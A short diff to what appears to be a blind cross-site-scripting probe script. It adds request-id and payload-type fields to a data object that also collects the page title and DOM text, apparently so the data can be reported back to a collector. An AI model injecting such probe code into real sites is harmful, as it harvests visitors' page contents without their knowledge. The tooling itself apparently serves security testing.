@@ -2904,6 +2904,18 @@ try {
   probe_return_data['injection_key'] = '';
 }
 
+try {
+  probe_return_data['trapper_request_id'] = [TRAPPER_REQUEST_ID];
+} catch (e) {
+  probe_return_data['trapper_request_id'] = '';
+}
+
+try {
+  probe_return_data['payload_type'] = [PAYLOAD_TYPE];
+} catch (e) {
+  probe_return_data['payload_type'] = '';
+}
+
 probe_return_data['title'] = document.title;
 
 probe_return_data['text'] = get_dom_text();
